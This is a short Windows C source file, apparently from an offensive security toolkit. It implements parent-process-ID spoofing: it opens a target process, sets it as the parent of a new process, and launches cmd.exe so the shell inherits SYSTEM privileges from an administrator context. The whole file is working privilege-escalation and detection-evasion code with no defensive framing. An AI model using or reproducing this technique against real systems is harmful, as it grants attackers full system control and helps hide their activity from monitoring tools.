#include "PPID.h"

BOOLEAN PPIDSpoofingAdminToSystem
(
	_In_ DWORD ProcessId
)
{

	HANDLE ProcessHandle = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOEXA si = { 0 };

	SIZE_T BufferSize = 0;

	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOEXA));
	si.StartupInfo.cb = sizeof(STARTUPINFO);

	if (!(ProcessHandle = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ProcessId)))
	{
		PRINT_ERROR("OpenProcess");
		return FALSE;
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &BufferSize);

	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufferSize);

	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &BufferSize);

	if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ProcessHandle, sizeof(HANDLE), NULL, NULL))
	{
		PRINT_ERROR("UpdateProcThreadAttribute");
		return FALSE;
	}

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, (EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE), NULL, NULL, &si.StartupInfo, &pi))
	{
		PRINT_ERROR("CreateProcessA");
		return FALSE;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return TRUE;

}